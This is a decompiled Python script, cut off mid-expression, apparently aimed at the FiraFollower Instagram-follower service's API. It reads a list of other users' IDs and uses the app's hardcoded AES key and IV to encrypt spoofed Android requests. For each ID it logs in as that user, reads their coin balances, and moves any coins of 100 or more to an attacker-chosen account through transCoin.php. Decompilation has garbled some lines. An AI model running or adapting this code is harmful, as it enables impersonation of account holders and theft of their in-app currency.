#Decode By @py_id
#Decode Ch @decrypt_marshalopyright = '@psh_team'
        import requests
        import json
        from urllib.parse import quote
        from base64 import b64encode, b64decode
        from binascii import unhexlify
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad
        A = '\x1b[1;91m'
        B = '\x1b[1;96m'
        C = '\x1b[1;97m'
        E = '\x1b[1;92m'
        H = '\x1b[1;93m'
        L = '\x1b[1;95m'
        M = '\x1b[1;94m'
        logo = '     _       __                     _
  __| | ___ / _| ___ _ __ ___ _ __ | |_
 / _` |/ _ \ |_ / _ \ '__/ _ \ '_ \| __|
| (_| |  __/  _|  __/ | |  __/ | | | |_
 \__,_|\___|_|  \___|_|  \___|_| |_|\__|
 
 @deferent_404
 '
        print(M + logo)
        list2 = input(f'''{E}Please Enter List Id {L}: {B}''')
        myid = input(f'''{E}Please Enter Id To Send Coin {L}: {B}''')
        
        def enc(msg):
            password = '83108793d2e582de26095e6365006b683549db8300bac461d36fb6e4c27f2dbd'
            iv = '51afa8b2e0a47a37881424fb9b88b8bc'
            iv = unhexlify(iv)
            password = unhexlify(password)
            msg = pad(msg.encode(), AES.block_size)
            cipher = AES.new(password, AES.MODE_CBC, iv)
            cipher_text = cipher.encrypt(msg)
            out = b64encode(cipher_text).decode('utf-8')
            return out

        
        def dec(msg):
            password = '83108793d2e582de26095e6365006b683549db8300bac461d36fb6e4c27f2dbd'
            iv = '51afa8b2e0a47a37881424fb9b88b8bc'
            iv = unhexlify(iv)
            password = unhexlify(password)
            msg = pad(msg.encode(), AES.block_size)
            decipher = AES.new(password, AES.MODE_CBC, iv)
            plaintext = unpad(decipher.decrypt(b64decode(msg)), AES.block_size).decode('utf-8')
            return plaintext

        list1 = open(list2, 'r')
        
        try:
            idtar = list1.readline().split('\n')[0]
            data = '{"requested_with":"mehran.firazarin.android","version_code":"115","market_name":"cafebazaar","language_code":"ar","device_info":"480dpi; 1080x1848; Lenovo; Lenovo K53a48; karatep; S82939AA1","sdk_info":"24\/7.0","android_id":"3e96c068dcdbbbee","app_signature":"61ED377E85D386A8DFEE6B864BD85B0BFAA5AF81","user_pk":"' + str(idtar) + '","user_picture":"https:\/\/instagram.fbcn9-1.fna.fbcdn.net\/v\/t51.2885-19\/44884218_345707102882519_2446069589734326272_n.jpg?_nc_ht=instagram.fbcn9-1.fna.fbcdn.net&_nc_cat=1&_nc_ohc=gsvQ8GMiFaYAX8gS26p&edm=ALlQn9MBAAAA&ccb=7-5&ig_cache_key=YW5vbnltb3VzX3Byb2ZpbGVfcGlj.2-ccb7-5&oh=00_AT_lW1JEWFNwxeDqoghSuL_D5NSE6p1pKRl6ghpuxxNOTQ&oe=6353520F&_nc_sid=48a2a6","sec_1":"","sec_2":"mikomiko11332244@gmail.com","username":"4e_dv","full_name":"dark","login":""}'
            data = enc(data)
            headers = {
                'Host': 'firafollower.xyz',
                'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 10; M2006C3LG MIUI/V12.0.20.0.QCDMIXM)',
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate',
                'content-type': 'text/xml',
                'x-access': 'FiraFollower',
                'x-version': '2',
                'content-length': '693' }
            stat = dec(requests.post('https://firafollower.xyz/api/v4/account.php', headers, data, **('headers', 'data')).text)
            token = json.loads(stat)
            if 'checkpoint_required.' in stat or 'account blocked.' in stat:
                print(A + f'''Blocked {L}: {B}{idtar}''')
            else:
                user_token = token['data']['user_token']
                data = '{"requested_with":"mehran.firazarin.android","version_code":"115","market_name":"cafebazaar","language_code":"ar","device_info":"320dpi; 720x1449; Redmi; M2006C3LG; dandelion_global; dandelion","sdk_info":"29\/10","android_id":"042b66ad34d63dae","app_signature":"61ED377E85D386A8DFEE6B864BD85B0BFAA5AF81","user_pk":"' + str(idtar) + '","user_picture":"https:\/\/instagram.fisu4-2.fna.fbcdn.net\/v\/t51.2885-19\/292087357_3143992945818603_61804610724414833_n.jpg?stp=dst-jpg_s150x150&_nc_ht=instagram.fisu4-2.fna.fbcdn.net&_nc_cat=103&_nc_ohc=i8ervsw7MAsAX8uvaQW&edm=AEF8tYYBAAAA&ccb=7-5&oh=00_AT_8iJ5vd-XPEjjo6SbKXD0TFKpIqGut8DiqndOjDQWNag&oe=62FF9FF5&_nc_sid=a9513d","username":"mhmdtool","full_name":"mohammed","user_token": "' + str(user_token) + '"}'
                data = enc(data)
                m = requests.post('https://firafollower.xyz/api/v4/account.php', headers, data, **('headers', 'data')).text
                po = json.loads(dec(m))
                user_token = po['data']['user_token']
                follow_coin = po['data']['follow_coin']
                general_coin = po['data']['like_comment_coin']
                print(f'''{E}F_c{L}: {B}{follow_coin} {A}| {E}G.c {L}: {B}{general_coin}''')
                if follow_coin >= 100:
                    data = '{"requested_with":"mehran.firazarin.android","version_code":"115","market_name":"cafebazaar","language_code":"ar","device_info":"320dpi; 720x1449; Redmi; M2006C3LG; dandelion_global; dandelion","sdk_info":"29\/10","android_id":"042b66ad34d63dae","app_signature":"61ED377E85D386A8DFEE6B864BD85B0BFAA5AF81","user_token":"' + str(user_token) + '","user_pk":"' + str(idtar) + '","to_user":"' + str(myid) + '","coin":"' + str(follow_coin) + '","action":"follow","has_post":"false"}'
                    data = enc(data)
                    print(dec(requests.post('https://firafollower.xyz/api/v4/transCoin.php', headers, data, **('headers', 'data')).text))
                if general_coin >= 100:
                    data = '{"requested_with":"mehran.firazarin.android","version_code":"115","market_name":"cafebazaar","language_code":"ar","device_info":"320dpi; 720x1449; Redmi; M2006C3LG; dandelion_global; dandelion","sdk_info":"29\/10","android_id":"042b66ad34d63dae","app_signature":"61ED377E85D386A8DFEE6B864BD85B0BFAA5AF81","user_token":"' + str(user_token) + '","user_pk":"' + str(idtar) + '","to_user":"' + str(myid) + '","coin":"' + str(general_coin) + '","action":"like_comment","has_post":"false"}'
                    data = enc(data)
                    print(dec(requests.post('https://firafollower.xyz/api/v4/transCoin.php', headers, data, **('headers', 'data')).text))
            (lambda 
